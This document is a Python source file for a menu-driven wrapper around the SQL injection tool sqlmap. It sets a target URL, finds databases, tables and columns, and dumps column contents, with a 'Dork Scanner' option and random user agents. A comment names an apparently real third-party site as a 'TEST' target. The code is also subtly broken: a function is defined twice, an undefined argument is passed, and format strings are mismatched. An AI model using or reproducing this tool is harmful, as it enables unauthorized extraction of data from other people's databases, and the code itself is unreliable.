import os
import sys
import re
import linecache
from clear import clear
from logo import logo, BC


def start():    
    with open('sql/customArgs.py') as f:
        global customArgs
        customArgs = f.read()
    with open('sql/target.py') as f:
        global target
        target = f.read()
    with open('sql/sqlmapdir.py') as f:
        global sqlmapdir
        sqlmapdir = f.read()
    clear()
    menu()

#### TEST: http://berkeleyrecycling.org/page.php?id=1 ###
def scan():
    global sqlmapdir
    global target
    global customArgs
    os.system ( sqlmapdir + str(target + '--dbs --random-agent --batch ' + customArgs ) )
    tables = input("Check For Tables? [y/n/back] : ")
    if str(tables) == "y" or str(tables) == "Y":
        scanned(a)
    elif str(tables) == "back" or str(tables == "BACK"):
        menu()

def scanned():
    os.system ( sqlmapdir + target + ' --dbs --tables --random-agent --batch %s %s ' % (customArgs, )) 
    columns = input("Check for Columns in a table? [y/n/back] : ")
    if str(columns) == "y" or str(columns) == "Y":
        global table
        table = input("What Table do you wish to pull from: ")
        os.system ( sqlmapdir + target + '--dbs %s %s -T %s --columns' % (customArgs, table)) 
        dump = input("would you like to dump a Column? [y/n/back] : ")
        if str(dump) == "y" or str(dump) == "Y":
            global columned
            print("NOTE: Add ' >> file ' to the end if you wish to output to a file.")
            print("      Data will not display on terminal if you do so.")
            columned = input("What column would you like to dump?")
            scanned(a)
            os.system ( sqlmapdir + target + '--dbs %s -T %s -C %s --dump' % (a, table, columns)) 
        elif str(dump) == "back" or str(dump) == "BACK":
            scanned(a)
    elif str(columns) == "back" or str(columns) == "BACK":
        scanned(a)


def start():
    with open('sql/customArgs.py') as f:
        global customArgs
        customArgs = f.read()
        f.close()
    with open('sql/target.py') as f:
        global target
        target = f.read()
        f.close()
    clear()
    menu()
    
    
def menu():
    logo()
    global customArgs
    global target
    m6 = print("Current Target: " + target)
    m6 = print("Custom Args: " + customArgs)
    m6 = print("SQLMap Options")
    mitems = ("Dork Scanner", "Set Target", "Init Scan", "Custom Arguments", "Clear Arguments", "Custom Path To SQLMap")
    for idx, i in enumerate(mitems, start=1):
        print( BC.G + " [" + BC.F + str(idx) + BC.G + "] " + i)
    else:
        print("------------------------------------------")
        print(" [" + BC.F + "*" + BC.G + "] Main Menu")
        print(" [" + BC.F + "0" + BC.G + "] Exit")
    m6 = input("")
    if m6 == "1":
        clear()
        logo()
        os.system("./sql.sh")
        menu()
    elif m6 == "2":
        clear()
        logo()
        target = input("Set Target: ")
        with open('sql/target.py', 'w') as f:
            f.write(target)
        clear()
        menu()
    elif m6 == "3":
        clear()
        logo()
        scan()
        clear()
        menu()
    elif m6 == "4":
        os.system( sqlmapdir + ' -h')
        customArgs = input("Enter Arguments: ")
        with open('sql/customArgs.py', 'w') as f:
            f.write(customArgs)
        clear()
        menu()
    elif m6 == "5":
        with open('sql/customArgs.py', 'w') as f:
            f.write("")
        f.close()
        customArgs = ""
        clear()
        menu()
    elif m6 == "6":
        clear()
        logo()
        print("Example Paths: " + BC.F + "/usr/bin/sqlmap")
        print("               C:/Program Files/SQLMap/sqlmap.py" + BC.G)
        print("Note: If you have to launch sqlmap using 'python' please add it before the path.")
        print("")
        sqlmapdir = input("Enter your SQLMap file path: ")
        with open('sql/sqlmapdir.py', 'w') as f:
            f.write(sqlmapdir)
        clear()
        menu()
    elif m6 == "*":
        exit
    elif m6 == "0":
        sys.exit()